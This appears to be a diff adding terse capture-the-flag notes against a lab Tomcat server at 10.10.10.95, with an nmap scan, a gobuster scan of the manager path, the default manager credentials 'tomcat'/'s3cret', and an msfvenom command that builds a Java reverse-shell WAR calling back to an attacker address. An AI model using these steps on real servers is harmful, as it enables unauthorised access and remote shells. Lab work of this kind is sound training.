@@ -1,0 +1,23 @@
+└─$ nmap -A 10.10.10.95 -p 1-65535 -T5 -Pn
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-07-04 22:13 CEST
+Nmap scan report for 10.10.10.95
+Host is up (0.040s latency).
+Not shown: 65534 filtered tcp ports (no-response)
+PORT     STATE SERVICE VERSION
+8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+|_http-title: Apache Tomcat/7.0.88
+|_http-favicon: Apache Tomcat
+|_http-server-header: Apache-Coyote/1.1
+|_http-open-proxy: Proxy might be redirecting requests
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 78.15 seconds
+
+gobuster dir -u http://10.10.10.95:8080/manager -w /usr/share/wordlists/dirb/big.txt 
+
+http://10.10.10.95:8080/manager/html
+
+ tomcat with a password of s3cret
+ 
+ msfvenom -p java/shell_reverse_tcp lhost=10.10.14.5 lport=4444 -f war -o pwn.war
+ 
